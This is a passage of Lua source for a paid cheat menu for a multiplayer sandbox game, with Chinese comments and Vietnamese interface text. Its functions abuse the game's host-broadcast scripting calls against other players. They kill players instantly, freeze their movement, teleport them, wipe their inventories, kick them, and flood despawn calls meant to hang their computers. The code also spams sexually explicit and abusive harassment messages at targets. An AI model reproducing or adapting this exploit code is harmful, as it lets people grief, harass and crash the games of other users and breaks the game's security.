                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì 1000 lần không nghỉ")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    
                    while _G.dtms_enabled do
                        -- 无间隔连续执行1000次，内部不加任何wait
                        for loopCount = 1, 800 do
                            if not _G.dtms_enabled then
                                break
                            end
                            local dAttack = {
                                [1] = "gamerule",
                                [2] = "setKillNotify",
                                [3] = {true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, dAttack)
                            end)
                            
                            
                            local diAttack = {
                                [1] = "gamerule",
                                [2] = "setScoreKillPlayer",
                                [3] = {100}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack)
                            end)
                            -- 每10次重新施加禁止攻击（防止被清除）
                            if loopCount % 10 == 1 then
                                local keepDisable = {
                                    [1] = "player",
                                    [2] = "setActionAttrState",
                                    [3] = {targetUin, 32, false}
                                }
                                pcall(function()
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                                end)
                            end
                            
                            local disableAttack = {
                                [1] = "player",
                                [2] = "forceOpenBoxUI",
                                [3] = {targetUin,797}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                            end)
                            
                            
                            
                            
                            
                            
                            local setNick = {
                                [1] = "actor",
                                [2] = "setnickname",
                                [3] = {targetUin,'#RChó'}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)
                            end)
                            
                            local changeModel = {
                                [1] = "actor",
                                [2] = "changeCustomModel",
                                [3] = {targetUin,[=[mob_3407]=]}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                            end)
                            
                            local lockAttack = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin,32,false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, lockAttack)
                            end)
                            
                            -- ===== 设置目标为可攻击状态 =====
                            local setAttackable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 64, true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                            end)
                            
                            -- ===== 清除目标无敌buff =====
                            local clearBuff = {
                                [1] = "buff",
                                [2] = "clearAllBuff",
                                [3] = {targetUin}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                            end)
                            
                            -- 播放特效
                            local t1 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "jiguang01", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                            end)
                            
                            local t10 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "aotu_06_leishenzhichui", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                            end)
                            
                            -- 设置属性
                            local t2 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 1}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                            end)
                            local t3 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 2}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                            end)
                            
                            -- 造成伤害
                            local t4 = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {myUin, targetUin, 1.8e+308, 0}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                            end)
                            
                            -- 每100次提示进度
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#c00ffffTiến độ vòng này " .. loopCount .. "/1000")
                            end
                            -- 循环内部无任何等待，一次性跑完1000次
                        end

                        -- 1000次全部跑完后判断开关，关闭就直接跳出
                        if not _G.dtms_enabled then
                            break
                        end
                        
                        ShowGameTipsWithoutFilter("#c00ffffĐã hoàn thành 1000 lần hạ gục tức thì, tạm dừng 1 giây để tránh treo")
                        -- 仅整轮结束后等待1秒缓冲
                        threadpool:wait(5)
                    end
                    
                    -- 结束恢复目标攻击权限
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì đã chấm dứt")
                end)
            end
            -- ====================
        end
    end
)
end


function zdcr()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author6[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止 =====
            _G.cr_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.cr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启 =====
            _G.cr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.cr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.cr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần thao tác")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---

                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp đưa lên đầu mình")
                
                -- 启动循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.cr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 -0.1, myZ / 100+1
                        
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        
 local tdata3 = {
                            [1] = "player",
                            [2] = "playAct",
                            [3] = {targetUin, 15}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3) 
                        end)
                        local tdata4 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {targetUin, "A~~ cái 78 của bố to quá, con thích lắm, mạnh lên~ a~ mạnh lên"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata4) 
                        end)
                        
                        local tdata5 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {AccountManager:getUin(), "A~~ cái 78 của bố to quá, con thích lắm, mạnh lên~ a~ mạnh lên"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata5) 
                        end)
                        
                        
                        MusicClubSyncIns:sysncEquipWeapon(AccountManager:getUin(), 12285)
CurMainPlayer:playAct(600113)
                        
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100
threadpool:wait(0.1) 
CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'buff.buff_balala_xiaolan', 70, 50, 0, new_x, new_y, new_z, 0, 1, 100)
                        
                        
                        
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.1)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end

function zdtzw()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author5[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 默认配置
local defaultItemId = 15509  -- 默认火龙果

-- 先弹出输入框让用户输入物品ID
ShowTextInputSafe(function(text)
    local itemId = tonumber(text)
    if not itemId or itemId <= 0 then
        ShowGameTipsWithoutFilter("#cFF0000Hãy nhập ID vật phẩm hợp lệ!")
        return
    end
    
    -- 显示确认对话框
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái dừng\nBên phải bật\n#c00ffffID vật phẩm hiện tại:" .. itemId,
        "Điều khiển",
        nil,
        function(userData, btnType)
            if btnType == 0 then  -- 左边按钮：停止
                _G.ztmn_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
                
            elseif btnType == 1 then  -- 右边按钮：开启
                _G.ztmn_enabled = true
                ShowGameTipsWithoutFilter("#c00ffffĐã bật - ID vật phẩm:" .. itemId)
                
                -- 启动炸图循环
                threadpool:work(function()
                    while _G.ztmn_enabled do
                        -- 获取自己当前位置
                        local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                        local center_x = my_x / 100
                        local center_y = my_y / 100
                        local center_z = my_z / 100
                        
                        -- 向四面八方发射（8个方向）
                        for angle = 0, 315, 45 do
                            local rad = math.rad(angle)
                            local distance = math.random(50, 100)
                            local target_x = center_x + math.cos(rad) * distance
                            local target_z = center_z + math.sin(rad) * distance
                            local target_y = center_y
                            
                            -- 发射投掷物（使用自定义物品ID）
                            local tdata = {
                                [1] = "world",
                                [2] = "spawnProjectile",
                                [3] = {
                                    AccountManager:getUin(),
                                    itemId,  -- 使用自定义ID
                                    center_x, center_y + 2, center_z,
                                    target_x, target_y, target_z,
                                    500
                                }
                            }
                            
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                        
                        threadpool:wait(0.2)
                    end
                end)
            end
        end
    )
end, "Hãy nhập ID vật phẩm", "Thiết lập", "15509")
end

function ExecuteAntiBotLogic()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author1[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#RBật thành công")
for a=0,100000 do 
    threadpool:wait(0.00000001)
    
    trigger()
local curHp = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
-- 判断血量低于1时执行死亡逻辑
if curHp < 1 then
    -- 延迟极短时间，等待游戏底层血量状态同步完成
    threadpool:wait(0.00000001)
              -- 获取自己的迷你号
    -- 先拿到自己的迷你号，用来过滤
local myUin = AccountManager:getUin()
local num = ClientCurGame:getNumPlayerBriefInfo()
for i = 1, num do
    local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
    -- 增加 briefInfo.uin ~= myUin 排除自己
    if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
 
 for a=0,1000 do
 
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { briefInfo.uin, "#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày#RTao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
 end
local tdata = {
        [1] = "gamerule",
        [2] = "setAllowMidwayJoin",
        [3] = { 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

  threadpool:wait(0.01)
    AccountManager.cluster.buddysvr.routemore('gm.kick', briefInfo.uin,0)
    end -- 补全if闭合
end -- 补全for循环闭合


end
end
end




function bdn()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author2[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#RBật thành công, có thể bị lag một lúc")

 ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
    for a=0,1000000 do 
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end, "Làm treo PC")

end


function xhjs()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#RBật thành công")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng\nBên phải bật",
    "Đóng",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            _G.dffz_enabled = false
            -- 不要停止线程，让它自己检测到 false 后退出
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            
        elseif btnType == 1 then
            -- 重置状态
            _G.dffz_enabled = false
            
            -- 等待旧线程完全退出（如果有的话）
            if _G.dffz_thread then
                -- 不调用 stop，让线程自然退出
                _G.dffz_thread = nil
            end
            
            -- 延迟一下再开启，确保旧线程已退出
            threadpool:wait(0.1)
            
            _G.dffz_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật")
            
            if whitelist == nil then
                whitelist = {}
            end
            
            -- 使用 threadpool:work 创建新线程
            _G.dffz_thread = threadpool:work(function()
                local loopCount = 0
                while _G.dffz_enabled do
                    loopCount = loopCount + 1
                    
                    xpcall(function()
                        local myUin = AccountManager:getUin()
                        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                        
                        for i = 1, size do
                            if not _G.dffz_enabled then break end
                            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                            if targetPlayer then
                                local targetUin = targetPlayer:getUin()
                                if targetUin ~= myUin then
                                    if not whitelist[targetUin] then
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changPlayerMoveType"
                                        tdata[3] = {targetUin, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetTimeVanishingSpeed"
                                        tdata[3] = {500}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changeViewMode"
                                        tdata[3] = {targetUin, 9, true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 797}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "changeCustomModel"
                                        tdata[3] = {targetUin, "role_11"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFF- Đế uy quét #cFFFFAAkhắp thiên hạ\n#cFFBBEE- Quân lâm #cEEFFAAchín tầng trời mười cõi\n#cFFCCDD- Hoàng đạo #cDDFFAAđộc tôn vạn cổ\n#cFFDDCC- Long khiếu #cCCFFAArung chuyển hoàn vũ\n#cFFEEBB- Vương quyền #cBBFFAAnắm giữ sinh tử\n#cFFAAFF- Thánh quang #cAAFFAAchiếu khắp vạn giới\n#cFFBBEE- Thần huy quét sạch mọi tà ác", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "notifyGameInfo2Self"
                                        tdata[3] = {targetUin, "#cFFFFAAVương #cEEFFAAquyền #cDDFFAAnắm #cCCFFAAGiữ #cBBFFAAsinh #cAAFFAAtử"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "setnickname"
                                        tdata[3] = {targetUin, "#b#RTrung Hoa vạn tuế"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "backpack"
                                        tdata[2] = "clearAllPack"
                                        tdata[3] = {targetUin}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {targetUin, 1, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 64, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 128, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30005, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30006, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30007, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30008, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30009, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playerHurt"
                                        tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setAtt"
                                        tdata[3] = {targetUin, 1, 2}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "yanhua", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "12834", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "bossskill_lasertailblue", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "ice_bingshi_boss", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "mob_3514_white", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_xiqu", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_baozha", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {targetUin, "jiguang01", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end
                            end
                        end
                    end, function(err)
                        print("炸图循环错误: " .. tostring(err))
                    end)
                    
                    -- 使用 threadpool:wait
                    threadpool:wait(0.0000001)
                end
                print("炸图循环已退出")
                _G.dffz_thread = nil  -- 线程退出后清空引用
            end)
        end
    end
)
	end
	
function mswsbmd()
	
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author4[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
